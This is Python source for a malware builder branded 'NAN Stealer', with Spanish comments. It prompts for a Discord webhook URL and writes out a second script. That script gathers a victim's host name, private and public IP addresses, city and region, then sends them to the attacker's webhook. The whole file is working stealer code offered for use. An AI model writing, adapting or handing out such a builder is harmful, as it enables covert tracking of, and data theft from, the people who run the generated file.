from colorama import init, Fore


def create_ip_script():
    # Solicitar la URL del webhook de Discord y el nombre del archivo
    print(Fore.GREEN + """ _   _    _    _   _   ____  _             _           
| \ | |  / \  | \ | | / ___|| |_ ___  __ _| | ___ _ __ 
|  \| | / _ \ |  \| | \___ \| __/ _ \/ _` | |/ _ \ '__|
| |\  |/ ___ \| |\  |  ___) | ||  __/ (_| | |  __/ |   
|_| \_/_/   \_\_| \_| |____/ \__\___|\__,_|_|\___|_|   """)
    webhook_url = input(Fore.GREEN + "Ingresa la URL del webhook de Discord: ")
    file_name = input(Fore.GREEN + "Ingresa el nombre del archivo .py a generar: ")

    # Contenido del script Python que se generará
    script_content = f"""# -*- coding: utf-8 -*-
import socket
import requests
from discord_webhook import DiscordWebhook, DiscordEmbed

# Obtener el nombre del host
host_name = socket.gethostname()

# Obtener la dirección IP privada
private_ip = socket.gethostbyname(host_name)

# Obtener la dirección IP pública usando un servicio externo
public_ip = requests.get('https://api.ipify.org').text

# Obtener información adicional de la IP pública (ciudad y estado)
ip_info = requests.get(f'https://ipinfo.io/{{public_ip}}/json').json()
city = ip_info.get('city', 'Unknown')
region = ip_info.get('region', 'Unknown')

# Imprimir el nombre del host, la dirección IP privada y la dirección IP pública
print("Host name: ", host_name)
print("Private IP address: ", private_ip)
print("Public IP address: ", public_ip)
print("City: ", city)
print("Region: ", region)

# Configurar el contenido del mensaje y el webhook de Discord
content = "NAN Squad on top | NAN Stealer on top"
webhook_url = "{webhook_url}"
webhook = DiscordWebhook(url=webhook_url, username="NAN Stealer", content=content)

# Crear un embed con la información del host, IP privada, IP pública, ciudad y estado
embed = DiscordEmbed(
    title=f"IP: {{public_ip}} | Host: {{host_name}}",
    color=123123
)
embed.add_embed_field(name="Private IP", value=private_ip)
embed.add_embed_field(name="Public IP", value=public_ip)
embed.add_embed_field(name="City", value=city)
embed.add_embed_field(name="Region", value=region)

# Añadir el embed al webhook
webhook.add_embed(embed)

# Ejecutar el webhook para enviar el mensaje
response = webhook.execute()
"""

    # Guardar el contenido en un archivo con el nombre especificado
    with open(file_name, 'w', encoding='utf-8') as file:
        file.write(script_content)
    print(f"El archivo {file_name} ha sido creado exitosamente.")

# Ejecutar la función para crear el script
create_ip_script()
